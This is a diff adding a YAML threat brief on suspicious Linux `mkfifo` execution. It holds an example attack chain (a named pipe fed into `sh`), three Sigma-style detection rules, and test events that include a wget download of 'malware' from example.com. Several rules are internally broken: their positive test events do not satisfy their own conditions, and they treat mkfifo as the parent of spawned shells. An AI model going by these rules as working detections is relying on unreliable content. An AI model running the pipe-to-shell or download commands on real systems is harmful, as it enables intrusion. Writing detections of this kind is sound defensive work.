@@ -1,0 +1,123 @@
+id: brief-2024-01-03-mkfifo-execution
+slug: 2024-01-03-mkfifo-execution
+title: Suspicious mkfifo Execution on Linux
+summary: Detection of suspicious execution following the use of `mkfifo` command on Linux systems, potentially indicating malicious activity.
+severity: medium
+published_at: "2024-01-03T15:00:00Z"
+content: |
+    ## Overview
+
+    This threat brief focuses on detecting suspicious execution patterns following the use of the `mkfifo` command on Linux systems. The `mkfifo` command is used to create named pipes (FIFOs), which can be leveraged by attackers for inter-process communication, often as part of more complex attack chains. While `mkfifo` itself is a legitimate command, its usage followed by the execution of unusual or suspicious processes can indicate malicious activity. This behavior can be associated with various attack stages, from initial access to lateral movement, depending on how the named pipe is utilized.
+
+    ## Attack Chain
+
+    1.  Attacker gains initial access to a Linux system through an exploit or compromised credentials.
+    2.  The attacker executes `mkfifo` to create a named pipe (e.g., `mkfifo /tmp/evil_pipe`).
+    3.  A process writes data to the created named pipe (e.g., `echo "malicious command" > /tmp/evil_pipe`).
+    4.  A separate process reads data from the named pipe and executes it (e.g., `sh < /tmp/evil_pipe`).
+    5.  The executed command performs reconnaissance activities (e.g., `uname -a`, `whoami`).
+    6.  The attacker establishes persistence via cron jobs or systemd services.
+    7.  Lateral movement is achieved by using the named pipe for communication with other compromised machines.
+
+    ## Impact
+
+    Successful exploitation can lead to unauthorized access, data exfiltration, and system compromise. The use of named pipes enables attackers to hide command execution and evade traditional detection methods. The impact ranges from minor data breaches to complete system takeover, depending on the attacker's objectives and the compromised system's role within the organization.
+tags:
+    - execution
+    - linux
+    - mkfifo
+references:
+    - https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_suspicious_mkfifo_execution.toml
+rules:
+    - title: Suspicious mkfifo Followed by Shell Execution
+      description: Detects suspicious shell execution immediately after a mkfifo command.
+      logsource:
+        category: process_creation
+        product: linux
+      detection:
+        condition: selection_mkfifo and selection_shell
+        selection_mkfifo:
+            CommandLine|contains: mkfifo
+        selection_shell:
+            Image|endswith:
+                - /sh
+                - /bash
+                - /zsh
+            ParentProcessName|contains: mkfifo
+      level: high
+      tags:
+        - attack.execution
+        - attack.t1059.004
+      tests:
+        positive:
+            - name: mkfifo followed by shell execution
+              data:
+                - CommandLine: bash < /tmp/named_pipe
+                  Image: /bin/bash
+                  ParentProcessName: mkfifo
+        negative:
+            - name: Legitimate bash execution
+              data:
+                - CommandLine: bash script.sh
+                  Image: /bin/bash
+                  ParentProcessName: sshd
+    - title: mkfifo Creation in /tmp Followed by Execution
+      description: Detects mkfifo command creating a pipe in /tmp followed by the execution of suspicious processes.
+      logsource:
+        category: process_creation
+        product: linux
+      detection:
+        condition: selection_mkfifo and selection_process
+        selection_mkfifo:
+            CommandLine|contains: mkfifo /tmp/
+        selection_process:
+            ParentProcessName: mkfifo
+      level: medium
+      tags:
+        - attack.execution
+        - attack.t1059.004
+      tests:
+        positive:
+            - name: mkfifo in /tmp followed by wget
+              data:
+                - CommandLine: wget http://example.com/malware -O /tmp/malware
+                  Image: /usr/bin/wget
+                  ParentProcessName: mkfifo
+        negative:
+            - name: Normal process execution
+              data:
+                - CommandLine: ls -l /tmp/
+                  Image: /usr/bin/ls
+                  ParentProcessName: bash
+    - title: Detection of mkfifo command usage
+      description: Detects the usage of mkfifo command which could be related to malicious activity.
+      logsource:
+        category: process_creation
+        product: linux
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains: mkfifo
+      level: informational
+      tags:
+        - attack.execution
+        - attack.t1059.004
+      tests:
+        positive:
+            - name: mkfifo execution
+              data:
+                - CommandLine: mkfifo /tmp/testpipe
+                  Image: /usr/bin/mkfifo
+                  ParentProcessName: bash
+        negative:
+            - name: No mkfifo command
+              data:
+                - CommandLine: ls -l /tmp/
+                  Image: /usr/bin/ls
+                  ParentProcessName: bash
+ttps:
+    - tactic_id: TA0002
+      tactic_name: Execution
+      technique_id: T1059.004
+      technique_name: Command and Scripting Interpreter
+      subtechnique_name: Unix Shell
